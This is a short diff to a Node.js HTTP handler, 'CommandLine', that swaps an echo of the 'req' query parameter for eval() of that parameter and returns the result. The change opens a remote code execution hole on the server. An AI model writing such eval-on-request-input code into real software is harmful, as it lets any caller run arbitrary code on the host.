@@ -21,7 +21,8 @@ actions.Search = function(response) {
 
 actions.CommandLine = function(response, query) {
  	response.writeHead(200, { 'Content-Type': 'text/plain' });
-	response.write('response for ' + query['req'] + ' on ' + __dirname);
+	var line = query['req'];
+	response.write(eval(line) + '\n');
  	response.end();
 }
 
